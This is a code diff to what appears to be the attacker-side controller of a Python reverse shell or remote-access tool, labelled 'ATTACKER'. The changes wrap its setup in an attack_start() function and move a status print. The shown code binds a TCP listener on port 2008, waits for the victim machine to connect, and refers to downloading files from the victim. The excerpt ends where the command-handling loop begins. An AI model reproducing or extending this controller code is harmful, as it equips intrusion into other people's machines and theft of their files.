@@ -1,26 +1,25 @@
 # ========================== ATTACKER =======================
 import socket
 
-# to handle long results
-endResult = "EOR"
 
-# to handle downloading files from Victim
-endFile = "EOF"
+def attack_start():
+    # to handle long results
+    endResult = "EOR"
 
-
-def main():
+    # to handle downloading files from Victim
+    endFile = "EOF"
     # To Get ip of Attacker Host
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.connect(('10.0.0.0', 0))
     IPAttacker = s.getsockname()[0]
     PortAttacker = 2008
-
+    print("[+] Waiting for incoming connection ...")
     # Start
     AttackerConnection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     AttackerSocket = (IPAttacker, PortAttacker)
     AttackerConnection.bind(AttackerSocket)
     AttackerConnection.listen(10)
-    print("[+] Waiting for incoming connection ...")
+
     AttackerConnection, ClientSocket = AttackerConnection.accept()
     print("Connection from>>> ", ClientSocket[0] + ":{}".format(ClientSocket[1]))
     try:
